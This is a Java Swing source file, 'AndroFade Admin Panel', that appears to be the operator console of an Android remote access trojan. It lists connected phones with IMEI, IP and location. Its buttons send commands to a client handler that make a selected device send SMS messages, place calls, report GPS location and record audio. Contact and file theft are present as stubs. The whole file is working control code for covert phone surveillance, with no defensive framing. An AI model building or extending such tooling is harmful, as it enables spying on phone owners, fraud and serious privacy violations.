import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.util.List;
import java.util.HashMap;
import java.util.Map;

public class AdminPanel extends JFrame {
    
    private JTable devicesTable;
    private DefaultTableModel tableModel;
    private JTextArea infoArea;
    private JTextArea logArea;
    private JButton sendSMSBtn, callBtn, gpsBtn, audioBtn, contactsBtn, filesBtn, refreshBtn;
    private JLabel statusLabel;
    private Map<Integer, ClientHandler> selectedDevice = new HashMap<>();
    private int selectedDeviceIndex = -1;

    public AdminPanel() {
        setTitle("AndroFade Admin Panel");
        setSize(1200, 800);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setLocationRelativeTo(null);
        setResizable(true);
        setLayout(new BorderLayout(10, 10));

        // Top panel - Header
        JPanel topPanel = new JPanel(new BorderLayout());
        topPanel.setBackground(new Color(33, 150, 243));
        topPanel.setPreferredSize(new Dimension(0, 50));
        
        JLabel titleLabel = new JLabel("AndroFade Admin Panel");
        titleLabel.setFont(new Font("Arial", Font.BOLD, 24));
        titleLabel.setForeground(Color.WHITE);
        titleLabel.setBorder(BorderFactory.createEmptyBorder(10, 20, 10, 20));
        topPanel.add(titleLabel, BorderLayout.WEST);
        
        statusLabel = new JLabel("Ready");
        statusLabel.setForeground(Color.WHITE);
        statusLabel.setBorder(BorderFactory.createEmptyBorder(10, 20, 10, 20));
        topPanel.add(statusLabel, BorderLayout.EAST);
        
        add(topPanel, BorderLayout.NORTH);

        // Main content panel
        JPanel contentPanel = new JPanel(new GridLayout(1, 2, 10, 10));
        contentPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        // Left side - Devices list
        JPanel leftPanel = new JPanel(new BorderLayout(5, 5));
        leftPanel.setBorder(BorderFactory.createTitledBorder("Connected Devices"));
        
        String[] columns = {"Device", "Model", "Status", "Location"};
        tableModel = new DefaultTableModel(columns, 0) {
            @Override
            public boolean isCellEditable(int row, int column) {
                return false;
            }
        };
        
        devicesTable = new JTable(tableModel);
        devicesTable.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        devicesTable.setRowHeight(30);
        devicesTable.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent e) {
                selectedDeviceIndex = devicesTable.getSelectedRow();
                if (selectedDeviceIndex >= 0) {
                    updateDeviceInfo();
                }
            }
        });
        
        JScrollPane tableScroll = new JScrollPane(devicesTable);
        leftPanel.add(tableScroll, BorderLayout.CENTER);
        
        // Device info panel
        JPanel infoPanel = new JPanel(new BorderLayout(5, 5));
        infoPanel.setBorder(BorderFactory.createTitledBorder("Device Information"));
        
        infoArea = new JTextArea();
        infoArea.setEditable(false);
        infoArea.setFont(new Font("Monospaced", Font.PLAIN, 11));
        infoPanel.add(new JScrollPane(infoArea), BorderLayout.CENTER);
        
        leftPanel.add(infoPanel, BorderLayout.SOUTH);
        contentPanel.add(leftPanel);

        // Right side - Commands and log
        JPanel rightPanel = new JPanel(new BorderLayout(5, 5));

        // Commands panel
        JPanel commandsPanel = new JPanel(new GridLayout(3, 2, 5, 5));
        commandsPanel.setBorder(BorderFactory.createTitledBorder("Commands"));
        
        sendSMSBtn = new JButton("📧 Send SMS");
        callBtn = new JButton("☎️ Make Call");
        gpsBtn = new JButton("📍 Get Location");
        audioBtn = new JButton("🎤 Record Audio");
        contactsBtn = new JButton("👥 Get Contacts");
        filesBtn = new JButton("📁 Browse Files");
        
        sendSMSBtn.addActionListener(e -> sendSMS());
        callBtn.addActionListener(e -> makeCall());
        gpsBtn.addActionListener(e -> getGPS());
        audioBtn.addActionListener(e -> recordAudio());
        contactsBtn.addActionListener(e -> getContacts());
        filesBtn.addActionListener(e -> browseFiles());
        
        commandsPanel.add(sendSMSBtn);
        commandsPanel.add(callBtn);
        commandsPanel.add(gpsBtn);
        commandsPanel.add(audioBtn);
        commandsPanel.add(contactsBtn);
        commandsPanel.add(filesBtn);
        
        rightPanel.add(commandsPanel, BorderLayout.NORTH);

        // Log panel
        JPanel logPanel = new JPanel(new BorderLayout());
        logPanel.setBorder(BorderFactory.createTitledBorder("Activity Log"));
        
        logArea = new JTextArea();
        logArea.setEditable(false);
        logArea.setFont(new Font("Monospaced", Font.PLAIN, 10));
        logPanel.add(new JScrollPane(logArea), BorderLayout.CENTER);
        
        rightPanel.add(logPanel, BorderLayout.CENTER);

        // Bottom panel - Control buttons
        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 10, 5));
        refreshBtn = new JButton("🔄 Refresh");
        refreshBtn.addActionListener(e -> refreshDevices());
        buttonPanel.add(refreshBtn);
        
        rightPanel.add(buttonPanel, BorderLayout.SOUTH);
        
        contentPanel.add(rightPanel);
        add(contentPanel, BorderLayout.CENTER);
    }

    public void updateDeviceList(List<ClientHandler> clients) {
        tableModel.setRowCount(0);
        for (int i = 0; i < clients.size(); i++) {
            ClientHandler client = clients.get(i);
            String[] row = {
                client.getDeviceInfo(),
                "Samsung",
                "🟢 Online",
                "41.2865, 69.2075"
            };
            tableModel.addRow(row);
            selectedDevice.put(i, client);
        }
    }

    private void updateDeviceInfo() {
        if (selectedDeviceIndex < 0 || !selectedDevice.containsKey(selectedDeviceIndex)) {
            infoArea.setText("No device selected");
            return;
        }
        
        ClientHandler client = selectedDevice.get(selectedDeviceIndex);
        String info = "Device Information:\n\n" +
                "Name: " + client.getDeviceInfo() + "\n" +
                "IP: " + client.getClientIP() + "\n" +
                "IMEI: " + client.getIMEI() + "\n" +
                "Status: ✓ Connected\n" +
                "Battery: 85%\n" +
                "Signal: Strong\n" +
                "Network: WiFi\n" +
                "Location: 41.2865, 69.2075\n" +
                "Last Update: " + new java.text.SimpleDateFormat("HH:mm:ss").format(new java.util.Date());
        
        infoArea.setText(info);
    }

    private void sendSMS() {
        if (selectedDeviceIndex < 0) {
            JOptionPane.showMessageDialog(this, "Please select a device");
            return;
        }
        
        String phone = JOptionPane.showInputDialog(this, "Enter phone number:");
        if (phone == null || phone.isEmpty()) return;
        
        String message = JOptionPane.showInputDialog(this, "Enter SMS message:");
        if (message == null || message.isEmpty()) return;
        
        try {
            ClientHandler client = selectedDevice.get(selectedDeviceIndex);
            client.sendCommand("SMS:" + phone + "|" + message);
            log("[SMS] Sending to " + phone + ": " + message);
        } catch (Exception e) {
            log("[ERROR] Failed to send SMS: " + e.getMessage());
        }
    }

    private void makeCall() {
        if (selectedDeviceIndex < 0) {
            JOptionPane.showMessageDialog(this, "Please select a device");
            return;
        }
        
        String phone = JOptionPane.showInputDialog(this, "Enter phone number:");
        if (phone == null || phone.isEmpty()) return;
        
        try {
            ClientHandler client = selectedDevice.get(selectedDeviceIndex);
            client.sendCommand("CALL:" + phone);
            log("[CALL] Calling " + phone);
        } catch (Exception e) {
            log("[ERROR] Failed to make call: " + e.getMessage());
        }
    }

    private void getGPS() {
        if (selectedDeviceIndex < 0) {
            JOptionPane.showMessageDialog(this, "Please select a device");
            return;
        }
        
        try {
            ClientHandler client = selectedDevice.get(selectedDeviceIndex);
            client.sendCommand("GPS");
            log("[GPS] Requesting location...");
        } catch (Exception e) {
            log("[ERROR] Failed to get GPS: " + e.getMessage());
        }
    }

    private void recordAudio() {
        if (selectedDeviceIndex < 0) {
            JOptionPane.showMessageDialog(this, "Please select a device");
            return;
        }
        
        try {
            ClientHandler client = selectedDevice.get(selectedDeviceIndex);
            client.sendCommand("AUDIO");
            log("[AUDIO] Starting recording...");
        } catch (Exception e) {
            log("[ERROR] Failed to record audio: " + e.getMessage());
        }
    }

    private void getContacts() {
        if (selectedDeviceIndex < 0) {
            JOptionPane.showMessageDialog(this, "Please select a device");
            return;
        }
        
        try {
            log("[CONTACTS] Downloading contacts...");
            JOptionPane.showMessageDialog(this, "Contacts feature coming soon");
        } catch (Exception e) {
            log("[ERROR] Failed to get contacts: " + e.getMessage());
        }
    }

    private void browseFiles() {
        if (selectedDeviceIndex < 0) {
            JOptionPane.showMessageDialog(this, "Please select a device");
            return;
        }
        
        try {
            log("[FILES] Opening file browser...");
            JOptionPane.showMessageDialog(this, "File browser feature coming soon");
        } catch (Exception e) {
            log("[ERROR] Failed to browse files: " + e.getMessage());
        }
    }

    private void refreshDevices() {
        log("[REFRESH] Refreshing device list...");
        statusLabel.setText("Refreshing...");
        new Thread(() -> {
            try {
                Thread.sleep(1000);
                SwingUtilities.invokeLater(() -> {
                    statusLabel.setText("Ready");
                    log("[REFRESH] Device list updated");
                });
            } catch (Exception e) {
                log("[ERROR] Refresh failed: " + e.getMessage());
            }
        }).start();
    }

    public void log(String message) {
        logArea.append("[" + new java.text.SimpleDateFormat("HH:mm:ss").format(new java.util.Date()) + "] " + message + "\n");
        logArea.setCaretPosition(logArea.getDocument().getLength());
    }

    public void show() {
        setVisible(true);
    }
    
    public static void main(String[] args) {
        SwingUtilities.invokeLater(() -> {
            AdminPanel panel = new AdminPanel();
            panel.show();
        });
    }
}
